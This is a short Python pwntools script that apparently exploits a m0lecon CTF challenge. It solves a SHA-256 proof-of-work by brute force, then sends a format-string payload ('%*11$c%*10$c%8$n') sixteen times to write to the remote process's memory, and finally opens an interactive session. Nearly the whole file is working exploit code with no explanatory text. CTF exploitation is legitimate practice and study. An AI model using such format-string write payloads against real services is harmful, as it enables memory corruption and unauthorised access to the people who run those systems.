from pwn import *
from itertools import product
from string import ascii_letters
import hashlib

p = None

def genSHA(string_start, sha_end):
    for item in product(ascii_letters, repeat=6):
        solution = string_start+''.join(item).encode('ascii')
        test = hashlib.sha256(solution).hexdigest()
        if test.endswith(sha_end.decode('ascii')):
            return solution

def solvePoW():
    p.recvuntil("Give me a string starting with ")
    string_start = p.recvuntil(" ")[:-1]
    p.recvuntil("ends in ")
    sha_end = p.recvuntil(".")[:-1]

    print(f"[+] String start: {string_start}, SHA256 end: {sha_end}")
    sha_solution = genSHA(string_start, sha_end)
    print(sha_solution)

    p.sendline(sha_solution)

def run():
    global p
    p = remote("challs.m0lecon.it","1907")

    solvePoW()

    p.recvuntil("summed to ")
    sum = int(p.recvuntil("!")[:-1])
    for i in range(16):
        p.sendlineafter("\n", "%*11$c%*10$c%8$n")

    p.interactive()


if __name__ == "__main__":
    run()